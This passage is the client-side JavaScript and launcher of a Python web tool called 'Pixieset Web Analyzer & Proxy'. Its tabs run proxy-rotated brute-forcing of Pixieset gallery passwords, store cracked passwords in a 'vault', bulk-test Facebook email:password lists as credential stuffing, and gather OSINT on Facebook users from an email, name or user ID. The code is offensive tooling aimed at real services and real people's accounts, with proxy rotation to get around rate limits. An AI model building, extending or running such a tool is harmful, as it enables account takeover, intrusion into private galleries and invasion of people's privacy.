  $('proxy-history').innerHTML = '<p class="subtitle">Cleared.</p>';
}

// ---- PASSWORD TESTER ----
async function doTestPassword() {
  const base = $('test-base').value.trim();
  const slug = $('test-slug').value.trim();
  const pwd = $('test-password').value.trim();
  if(!base || !slug) return;
  try {
    const r = await fetch('/test-password', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({url: base, slug, password: pwd})});
    const d = await r.json();
    renderTestResult(d);
  } catch(e) {
    $('test-result').innerHTML = '<p style="color:var(--red)">Error: '+esc(e.message)+'</p>';
  }
}

function renderTestResult(d) {
  let html = '<div class="card"><div class="card-header">🔑 Test Result: <code>'+esc(d.password_tested)+'</code> on <code>'+esc(d.slug)+'</code></div>';
  html += '<p><strong>Login URL:</strong> <code>'+esc(d.login_url)+'</code></p>';
  if(d.any_success)
    html += '<p style="color:var(--green);font-size:1.2em;font-weight:700">✓ PASSWORD FOUND: <code>'+esc(d.password_tested)+'</code></p>';

  if(d.results && d.results.length) {
    html += '<table><tr><th>Form Field</th><th>Status</th><th>Result</th></tr>';
    d.results.forEach(r => {
      html += '<tr><td><code>'+esc(r.field)+'</code></td>';
      html += '<td style="color:'+(r.success?'var(--green)':'var(--red)')+'">'+(r.success?'✓':'✗')+'</td>';
      html += '<td>'+esc(r.message||'')+'</td></tr>';
    });
    html += '</table>';
  }
  html += '</div>';
  $('test-result').innerHTML = html;
}

// ---- JS INSPECTOR ----
async function doFetchJS() {
  const url = $('js-url').value.trim();
  if(!url) return;
  $('js-result').innerHTML = '<div class="loading visible"><span class="spinner"></span> Fetching JS...</div>';
  try {
    const r = await fetch('/fetch-js', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({url})});
    const d = await r.json();
    renderJSResult(d);
  } catch(e) {
    $('js-result').innerHTML = '<p style="color:var(--red)">Error: '+esc(e.message)+'</p>';
  }
}

function renderJSResult(d) {
  let html = '<div class="card"><div class="card-header">📜 JS: <code>'+esc(d.url)+'</code></div>';
  html += '<div class="stats mb10">'+statBox('Status', d.status_code||'?', '')+statBox('Size', (d.length||0).toLocaleString()+' bytes', '')+'</div>';

  if(d.findings && d.findings.length) {
    html += '<h2 style="color:var(--red)">🚩 Findings ('+d.findings.length+')</h2>';
    d.findings.forEach(f => {
      html += '<div class="finding finding-critical"><strong>'+esc(f.type)+'</strong>: <code>'+esc(f.match||'')+'</code>'+ (f.context ? '<br><code>'+esc(f.context)+'</code>' : '')+'</div>';
    });
  } else {
    html += '<p class="subtitle">No hardcoded secrets found in this file.</p>';
  }

  if(d.content)
    html += '<h2>Source</h2><pre>'+esc(d.content.substring(0, 15000))+'</pre>';

  html += '</div>';
  $('js-result').innerHTML = html;
}

// ---- FARM BRUTE FORCE ----
let _farmPollTimer = null;
let _farmActiveJob = null;

async function loadFarmProxies() {
  try {
    const r = await fetch('/farm/proxies');
    const d = await r.json();
    const el = $('farm-proxy-badge');
    if (!el) return;
    if (d.exists && d.count > 0)
      el.innerHTML = 'Proxy farm: <strong style="color:var(--green)">' + d.count + ' IPs</strong> ready';
    else
      el.innerHTML = '<span style="color:var(--yellow)">No proxies.txt — direct mode (3-attempt cap)</span>';
  } catch(e) {}
}

async function doFarmStart() {
  const urls = $('farm-urls').value.trim();
  if (!urls) {
    $('farm-start-msg').innerHTML = '<div class="finding finding-medium">Paste at least one gallery URL</div>';
    return;
  }
  const payload = {
    urls: urls,
    extra_words: $('farm-extra').value,
    wordlist: $('farm-wordlist').value,
    auto: $('farm-auto').checked,
    use_proxy: $('farm-proxy').checked,
    delay: parseFloat($('farm-delay').value) || 2.0,
  };
  $('farm-start-btn').disabled = true;
  try {
    const r = await fetch('/farm/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
    });
    const d = await r.json();
    if (d.error) {
      $('farm-start-msg').innerHTML = '<div class="finding finding-critical">' + esc(d.error) + '</div>';
    } else {
      const ok = (d.jobs || []).filter(j => j.id);
      const bad = (d.jobs || []).filter(j => j.error);
      let msg = '<div class="finding finding-low">Queued <strong>' + ok.length + '</strong> job(s)</div>';
      bad.forEach(j => { msg += '<div class="finding finding-medium">' + esc(j.url) + ': ' + esc(j.error) + '</div>'; });
      $('farm-start-msg').innerHTML = msg;
      if (ok.length) {
        _farmActiveJob = ok[0].id;
        startFarmPoll();
      }
      loadFarmJobs();
    }
  } catch(e) {
    $('farm-start-msg').innerHTML = '<div class="finding finding-critical">Error: ' + esc(e.message) + '</div>';
  }
  $('farm-start-btn').disabled = false;
}

function startFarmPoll() {
  if (_farmPollTimer) clearInterval(_farmPollTimer);
  _farmPollTimer = setInterval(async () => {
    await loadFarmJobs();
    if (_farmActiveJob) await showFarmDetail(_farmActiveJob, true);
  }, 2500);
}

async function loadFarmJobs() {
  try {
    const r = await fetch('/farm/list');
    const d = await r.json();
    const jobs = d.jobs || [];
    if (!jobs.length) {
      $('farm-jobs').innerHTML = '<p class="subtitle">No jobs yet.</p>';
      return;
    }
    let html = '';
    let anyRunning = false;
    jobs.forEach(j => {
      const st = j.status || '?';
      if (st === 'running' || st === 'queued') anyRunning = true;
      let color = 'var(--text2)';
      if (st === 'done') color = 'var(--green)';
      else if (st === 'running') color = 'var(--accent)';
      else if (st === 'queued') color = 'var(--yellow)';
      else if (st === 'error' || st === 'failed') color = 'var(--red)';
      const found = j.found_password
        ? ' <strong style="color:var(--green)">→ ' + esc(j.found_password) + '</strong>'
        : '';
      const active = (_farmActiveJob === j.id) ? 'border-color:var(--accent)' : '';
      html += '<div class="finding finding-low" style="cursor:pointer;' + active + '" onclick="showFarmDetail(\'' + j.id + '\')">';
      html += '<strong>' + esc(j.host) + '</strong> / <code>' + esc(j.slug) + '</code><br>';
      html += '<span style="color:' + color + '">' + esc(st) + '</span> · ' + (j.attempts||0) + ' attempts' + found;
      if (j.error) html += '<br><span style="color:var(--red)">' + esc(j.error) + '</span>';
      html += '</div>';
    });
    $('farm-jobs').innerHTML = html;
    if (!anyRunning && _farmPollTimer) {
      clearInterval(_farmPollTimer);
      _farmPollTimer = null;
    } else if (anyRunning && !_farmPollTimer) {
      startFarmPoll();
    }
  } catch(e) {
    $('farm-jobs').innerHTML = '<p style="color:var(--red)">Error loading jobs: ' + esc(e.message) + '</p>';
  }
}

async function showFarmDetail(jobId, silent) {
  _farmActiveJob = jobId;
  try {
    const r = await fetch('/farm/status/' + jobId);
    const j = await r.json();
    if (j.error && !j.id) {
      if (!silent) $('farm-detail').innerHTML = '<p style="color:var(--red)">' + esc(j.error) + '</p>';
      return;
    }
    let html = '<div class="card">';
    html += '<div class="card-header">' + esc(j.host) + ' / <code>' + esc(j.slug) + '</code></div>';
    html += '<div class="stats mb10">';
    html += statBox('Status', j.status||'?', j.status==='done'?'var(--green)':(j.status==='error'||j.status==='failed'?'var(--red)':'var(--accent)'));
    html += statBox('Attempts', (j.attempts||[]).length, '');
    html += statBox('Found', j.found_password || '—', j.found_password ? 'var(--green)' : '');
    html += '</div>';
    if (j.found_password)
      html += '<div class="finding finding-critical" style="border-color:var(--green);color:var(--green)"><strong>✓ CRACKED</strong> password = <code style="font-size:1.2em">' + esc(j.found_password) + '</code></div>';
    if (j.login_url)
      html += '<p class="subtitle">Login: <code>' + esc(j.login_url) + '</code></p>';
    if (j.attempts && j.attempts.length) {
      html += '<h2>Attempts</h2><table><tr><th>Password</th><th>Result</th><th>Code</th></tr>';
      j.attempts.forEach(a => {
        const mark = a.success ? '<span style="color:var(--green)">FOUND</span>'
          : (a.error ? '<span style="color:var(--yellow)">ERR</span>' : '<span style="color:var(--red)">fail</span>');
        html += '<tr><td><code>' + esc(a.password) + '</code></td><td>' + mark + (a.error?' '+esc(a.error):'') + '</td><td>' + (a.status_code||'') + '</td></tr>';
      });
      html += '</table>';
    }
    if (j.log && j.log.length) {
      html += '<h2>Log</h2><pre style="max-height:280px;overflow:auto;font-size:0.8em">' + esc((j.log||[]).join('\n')) + '</pre>';
    }
    html += '</div>';
    $('farm-detail').innerHTML = html;
  } catch(e) {
    if (!silent) $('farm-detail').innerHTML = '<p style="color:var(--red)">' + esc(e.message) + '</p>';
  }
}

// ---- OSINT TOOLS ----
async function doOSINTLookup(type) {
  let endpoint, payload;
  const resultEl = $('osint-' + type + '-result');
  if (!resultEl) return;

  switch(type) {
    case 'email':
      const email = $('osint-email').value.trim();
      if (!email) { resultEl.innerHTML = '<p style="color:var(--yellow)">Enter email or phone</p>'; return; }
      endpoint = '/osint/lookup-email'; payload = {email};
      break;
    case 'profile':
      const profile = $('osint-profile').value.trim();
      if (!profile) { resultEl.innerHTML = '<p style="color:var(--yellow)">Enter username or ID</p>'; return; }
      endpoint = '/osint/profile'; payload = {username: profile};
      break;
    case 'avatar':
      const uid = $('osint-avatar-id').value.trim();
      if (!uid || !/^\d+$/.test(uid)) { resultEl.innerHTML = '<p style="color:var(--yellow)">Enter numeric user ID</p>'; return; }
      endpoint = '/osint/avatar'; payload = {id: uid};
      break;
    case 'name':
      const name = $('osint-name').value.trim();
      if (!name) { resultEl.innerHTML = '<p style="color:var(--yellow)">Enter a name</p>'; return; }
      endpoint = '/osint/search-name'; payload = {name};
      break;
  }
  resultEl.innerHTML = '<div class="loading visible"><span class="spinner"></span> Looking up...</div>';
  try {
    const r = await fetch(endpoint, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)});
    const d = await r.json();
    renderOSINTResult(type, d);
  } catch(e) {
    resultEl.innerHTML = '<p style="color:var(--red)">Error: ' + esc(e.message) + '</p>';
  }
  loadOSINTHistory();
}

function renderOSINTResult(type, d) {
  const el = $('osint-' + type + '-result');
  if (!el) return;
  if (d.error) { el.innerHTML = '<p style="color:var(--red)">' + esc(d.error) + '</p>'; return; }

  if (type === 'email') {
    let html = '<div class="stats mb10">' + statBox('Query', esc(d.query), '') + statBox('Status', (d.findings||[]).map(f=>f.status).join(', ')||'?', '') + '</div>';
    (d.findings||[]).forEach(f => {
      const color = f.status === 'account_found' ? 'var(--green)' : (f.status === 'not_found' ? 'var(--red)' : 'var(--yellow)');
      html += '<div class="finding finding-low" style="border-left-color:' + color + '"><strong>' + esc(f.source) + '</strong>: ' + esc(f.detail) + '</div>';
    });
    el.innerHTML = html;
  } else if (type === 'profile') {
    let html = '';
    const pd = d.profile_data || {};
    if (pd.page_title) html += '<p><strong>Title:</strong> ' + esc(pd.page_title) + '</p>';
    if (pd.user_id) html += '<p><strong>User ID:</strong> <code>' + esc(pd.user_id) + '</code></p>';
    if (pd.location) html += '<p><strong>Location:</strong> ' + esc(pd.location) + '</p>';
    if (pd.work) html += '<p><strong>Work:</strong> ' + esc(pd.work.join(', ')) + '</p>';
    if (pd.bio) html += '<p><strong>Bio:</strong> ' + esc(pd.bio) + '</p>';
    if (pd.profile_picture) {
      html += '<p><strong>Profile Pic:</strong> <a href="' + esc(pd.profile_picture) + '" target="_blank"><code>' + esc(pd.profile_picture) + '</code></a></p>';
      html += '<img src="' + esc(pd.profile_picture) + '" style="max-width:120px;border-radius:8px;margin-top:4px" onerror="this.style.display=\'none\'">';
    }
    (d.findings||[]).forEach(f => {
      html += '<div class="finding finding-low"><strong>' + esc(f.source) + '</strong>: ' + esc(f.detail);
      if (f.profile_url) html += ' <a href="' + esc(f.profile_url) + '" target="_blank" style="font-size:0.85em">open</a>';
      html += '</div>';
    });
    el.innerHTML = html ? '<div class="card">' + html + '</div>' : '<p class="subtitle">No data returned.</p>';
  } else if (type === 'avatar') {
    let html = '<div class="stats mb10">' + statBox('User ID', esc(d.user_id), '') + statBox('Status', d.status, '') + '</div>';
    if (d.profile_picture) {
      html += '<a href="' + esc(d.profile_picture) + '" target="_blank"><img src="' + esc(d.profile_picture) + '" style="max-width:160px;border-radius:8px;margin:4px 0" onerror="this.style.display=\'none\'"></a>';
      html += '<p style="font-size:0.8em;word-break:break-all"><strong>Large:</strong> <code>' + esc(d.profile_picture) + '</code></p>';
      html += '<p style="font-size:0.8em"><strong>Normal:</strong> <code>' + esc(d.profile_picture_normal) + '</code></p>';
      html += '<p style="font-size:0.8em"><strong>Small:</strong> <code>' + esc(d.profile_picture_small) + '</code></p>';
    }
    el.innerHTML = '<div class="card">' + html + '</div>';
  } else if (type === 'name') {
    let html = '<div class="stats mb10">' + statBox('Query', esc(d.query), '') + statBox('Results', (d.profiles||[]).length, 'var(--accent)') + '</div>';
    if (d.error) html += '<p style="color:var(--red)">' + esc(d.error) + '</p>';
    if (d.note) html += '<p class="subtitle">' + esc(d.note) + '</p>';
    (d.profiles||[]).forEach(p => {
      html += '<div class="finding finding-low"><strong>' + esc(p.name) + '</strong><br><a href="' + esc(p.url) + '" target="_blank"><code>' + esc(p.url) + '</code></a></div>';
    });
    el.innerHTML = html;
  }
}

async function loadOSINTHistory() {
  try {
    const r = await fetch('/osint/history');
    const d = await r.json();
    const history = d.history || [];
    if (!history.length) {
      $('osint-history').innerHTML = '<p class="subtitle">No lookups yet.</p>';
      return;
    }
    let html = '';
    history.slice(0, 30).forEach(h => {
      const icons = {email_lookup: '\ud83d\udce7', profile: '\ud83d\udc64', avatar: '\ud83d\uddbc', name_search: '\ud83d\udd0d'};
      const icon = icons[h.type] || '\ud83c\udf10';
      const st = (h.result || {}).findings ? (h.result.findings[0]||{}).status : '?';
      let color = 'var(--text2)';
      if (st === 'account_found' || st === 'success') color = 'var(--green)';
      else if (st === 'not_found') color = 'var(--red)';
      html += '<div class="finding finding-low" style="padding:6px 10px;margin:4px 0">';
      html += '<span style="color:' + color + '">' + icon + '</span> <strong>' + esc(h.type) + '</strong>: <code>' + esc(h.query) + '</code>';
      html += ' <span style="font-size:0.75em;color:var(--text2)">' + esc((h.searched_at||'').replace('T',' ').substring(0,19)) + '</span>';
      html += '</div>';
    });
    $('osint-history').innerHTML = html;
  } catch(e) {}
}

async function doOSINTClear() {
  if (!confirm('Clear all OSINT lookup history?')) return;
  await fetch('/osint/clear', {method: 'DELETE'});
  loadOSINTHistory();
}

// ---- FACEBOOK ACCOUNTS ----
let _fbProxies = [];

async function loadFBProxies() {
  try {
    const r = await fetch('/farm/proxies');
    const d = await r.json();
    _fbProxies = d.proxies || [];
    const el = $('fb-proxy-status');
    if (!el) return;
    if (d.exists && d.count > 0)
      el.innerHTML = '(<strong style="color:var(--green)">' + d.count + ' IPs</strong> available)';
    else
      el.innerHTML = '(<span style="color:var(--yellow)">no proxies — direct mode</span>)';
  } catch(e) {}
}

async function doFBTest() {
  const email = $('fb-email').value.trim();
  const password = $('fb-password').value.trim();
  if (!email || !password) {
    $('fb-result').innerHTML = '<div class="finding finding-medium">Enter email/phone and password</div>';
    return;
  }
  $('fb-test-btn').disabled = true;
  $('fb-result').innerHTML = '<div class="loading visible"><span class="spinner"></span> Testing credentials...</div>';
  try {
    const r = await fetch('/fb/test', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password, use_proxy: $('fb-proxy').checked}),
    });
    const d = await r.json();
    renderFBResult(d);
    loadFBAccounts();
  } catch(e) {
    $('fb-result').innerHTML = '<div class="finding finding-critical">Error: ' + esc(e.message) + '</div>';
  }
  $('fb-test-btn').disabled = false;
}

function renderFBResult(d) {
  if (d.error) {
    $('fb-result').innerHTML = '<div class="finding finding-medium">' + esc(d.error) + '</div>';
    return;
  }
  let html = '<div class="stats mb10">';
  const color = d.any_success ? 'var(--green)' : (d.final_status === 'checkpoint' || d.final_status === '2fa' ? 'var(--yellow)' : 'var(--red)');
  html += statBox('Result', d.any_success ? '✓ SUCCESS' : d.final_status, color);
  html += statBox('Email', esc(d.email), '');
  html += statBox('Password', '<code>' + esc(d.password_tested) + '</code>', '');
  html += '</div>';

  if (d.any_success) {
    html += '<div class="finding finding-critical" style="border-color:var(--green);color:var(--green)"><strong>✓ LOGIN SUCCESSFUL</strong></div>';
  } else if (d.final_status === 'checkpoint') {
    html += '<div class="finding finding-medium">Checkpoint/verification required — account exists and password is correct but Facebook wants additional verification</div>';
  } else if (d.final_status === '2fa') {
    html += '<div class="finding finding-medium">2FA required — password is correct but code is needed</div>';
  } else if (d.final_status === 'locked') {
    html += '<div class="finding finding-high">Account locked — Facebook requires ID verification</div>';
  }

  if (d.attempts && d.attempts.length) {
    html += '<h2>Attempt Details</h2><table><tr><th>Endpoint</th><th>Status</th><th>Code</th><th>Detail</th></tr>';
    d.attempts.forEach(a => {
      const stColor = a.status === 'success' ? 'var(--green)' : (a.status === 'error' ? 'var(--red)' : 'var(--yellow)');
      html += '<tr><td>' + esc(a.endpoint) + '</td><td style="color:' + stColor + '">' + esc(a.status) + '</td><td>' + (a.status_code||'') + '</td><td>' + esc(a.detail||'') + '</td></tr>';
    });
    html += '</table>';
  }
  $('fb-result').innerHTML = html;
}

async function doFBBulk() {
  const raw = $('fb-bulk').value.trim();
  if (!raw) return;
  const lines = raw.split('\n').filter(l => l.includes(':'));
  if (!lines.length) {
    alert('Format: email:password (one per line)');
    return;
  }
  let results = [];
  for (const line of lines) {
    const [email, ...rest] = line.split(':');
    const password = rest.join(':');
    if (!email.trim() || !password) continue;
    try {
      const r = await fetch('/fb/test', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: email.trim(), password: password.trim(), use_proxy: $('fb-proxy').checked}),
      });
      const d = await r.json();
      results.push(d);
      // small delay between bulk tests
      await new Promise(r2 => setTimeout(r2, 1500));
    } catch(e) {
      results.push({email: email.trim(), error: e.message});
    }
  }
  // Show summary
  const success = results.filter(r => r.any_success).length;
  const checkpoint = results.filter(r => r.final_status === 'checkpoint' || r.final_status === '2fa').length;
  const failed = results.filter(r => !r.any_success && r.final_status !== 'checkpoint' && r.final_status !== '2fa').length;
  $('fb-result').innerHTML = '<div class="stats mb10">' +
    statBox('Total', results.length, '') +
    statBox('Success', success, 'var(--green)') +
    statBox('Checkpoint/2FA', checkpoint, 'var(--yellow)') +
    statBox('Failed', failed, 'var(--red)') +
    '</div>';
  loadFBAccounts();
  $('fb-bulk').value = '';
}

async function loadFBAccounts() {
  try {
    const r = await fetch('/fb/list');
    const d = await r.json();
    const accounts = d.accounts || [];
    if (!accounts.length) {
      $('fb-accounts-list').innerHTML = '<p class="subtitle">No accounts tested yet.</p>';
      return;
    }
    let html = '<table><tr><th>#</th><th>Email/Phone</th><th>Password</th><th>Status</th><th>Tested</th><th></th></tr>';
    accounts.forEach((a, i) => {
      let stColor = 'var(--red)';
      if (a.status === 'success') stColor = 'var(--green)';
      else if (a.status === 'checkpoint' || a.status === '2fa') stColor = 'var(--yellow)';
      else if (a.status === 'locked') stColor = 'var(--orange)';
      html += '<tr>';
      html += '<td>' + (i+1) + '</td>';
      html += '<td>' + esc(a.email) + '</td>';
      html += '<td><code>' + esc(a.password) + '</code></td>';
      html += '<td style="color:' + stColor + ';font-weight:600">' + esc(a.status) + '</td>';
      html += '<td style="font-size:0.8em;color:var(--text2)">' + esc((a.tested_at||'').replace('T',' ').substring(0,19)) + '</td>';
      html += '<td><button class="btn btn-sm btn-red" onclick="doFBDelete(' + i + ')">✕</button></td>';
      html += '</tr>';
    });
    html += '</table>';
    $('fb-accounts-list').innerHTML = html;
  } catch(e) {
    $('fb-accounts-list').innerHTML = '<p style="color:var(--red)">Error: ' + esc(e.message) + '</p>';
  }
}

async function doFBClear() {
  if (!confirm('Delete ALL tested Facebook accounts? This cannot be undone.')) return;
  try {
    await fetch('/fb/clear', {method: 'DELETE'});
    loadFBAccounts();
  } catch(e) {}
}

async function doFBDelete(idx) {
  try {
    await fetch('/fb/delete/' + idx, {method: 'DELETE'});
    loadFBAccounts();
  } catch(e) {}
}

// ---- FOUND PASSWORDS ----
async function loadFound() {
  try {
    const r = await fetch('/found');
    const d = await r.json();
    const found = d.found || [];
    if (!found.length) {
      $('found-list').innerHTML = '<p class="subtitle">Nothing cracked yet. Run Farm Brute Force or Password Tester to populate.</p>';
      return;
    }
    let html = '<table><tr><th>#</th><th>Gallery</th><th>Slug</th><th>Password</th><th>Source</th><th>Found</th><th></th></tr>';
    found.forEach((f, i) => {
      html += '<tr>';
      html += '<td>' + (i+1) + '</td>';
      html += '<td><a href="' + esc(f.gallery_url) + '" target="_blank" style="color:var(--accent)">' + esc(f.host) + '</a></td>';
      html += '<td><code>' + esc(f.slug) + '</code></td>';
      html += '<td><code style="color:var(--green);font-size:1.05em;font-weight:600">' + esc(f.password) + '</code></td>';
      html += '<td><span class="badge">' + esc(f.source||'?') + '</span></td>';
      html += '<td style="font-size:0.8em;color:var(--text2)">' + esc((f.found_at||'').replace('T',' ').substring(0,19)) + '</td>';
      html += '<td><button class="btn btn-sm btn-red" onclick="doDeleteFound(' + i + ')">✕</button></td>';
      html += '</tr>';
      html += '<tr><td></td><td colspan="6" style="padding-top:0;font-size:0.8em">Login: <code>' + esc(f.login_url||'') + '</code> &nbsp; Gallery: <a href="' + esc(f.gallery_url) + '" target="_blank">open</a></td></tr>';
    });
    html += '</table>';
    $('found-list').innerHTML = html;
    $('found-add-form').style.display = 'block';
  } catch(e) {
    $('found-list').innerHTML = '<p style="color:var(--red)">Error: ' + esc(e.message) + '</p>';
  }
}

async function doClearFound() {
  if (!confirm('Delete ALL found passwords? This cannot be undone.')) return;
  try {
    await fetch('/found', {method: 'DELETE'});
    loadFound();
  } catch(e) {}
}

async function doDeleteFound(idx) {
  try {
    await fetch('/found/' + idx, {method: 'DELETE'});
    loadFound();
  } catch(e) {}
}

async function doAddFound() {
  const host = $('found-host').value.trim();
  const slug = $('found-slug').value.trim();
  const pass = $('found-pass').value.trim();
  if (!host || !slug || !pass) return;
  try {
    await fetch('/found', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({host,slug,password:pass,source:'manual'})});
    $('found-host').value = '';
    $('found-slug').value = '';
    $('found-pass').value = '';
    loadFound();
  } catch(e) {}
}

// Load history on proxy tab open (lazy)
loadHistory();
loadFarmProxies();
loadFarmJobs();
loadFound();
loadFBProxies();
loadFBAccounts();
loadOSINTHistory();
</script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Pixieset Web Analyzer & Proxy")
    parser.add_argument("--port", type=int, default=5000, help="Listen port")
    parser.add_argument("--host", default="127.0.0.1", help="Bind address")
    args = parser.parse_args()

    print(f"""
╔══════════════════════════════════════════════════════════╗
║   Pixieset Web Analyzer & Proxy                         ║
╠══════════════════════════════════════════════════════════╣
║  URL:    http://{args.host}:{args.port}                         ║
║  Engine: curl_cffi (Chrome 110 impersonation)           ║
╠══════════════════════════════════════════════════════════╣
║  Tabs:                                                   ║
║   📊 Analyzer  — Source code dissection                 ║
║   🔁 Proxy     — Burp-style request/repeater            ║
║   🔑 Tester    — Manual password testing                ║
║   🌾 Farm     — Multi-IP bulk brute force              ║
║   🔓 Found    — Cracked passwords vault                ║
║   📡 OSINT    — FB intelligence: lookup, profile, avatar ║
║   📘 Facebook — Account credential testing             ║
║   📜 JS        — External JS secret scanning            ║
╚══════════════════════════════════════════════════════════╝
""")
    app.run(host=args.host, port=args.port, debug=False)


if __name__ == "__main__":
    main()
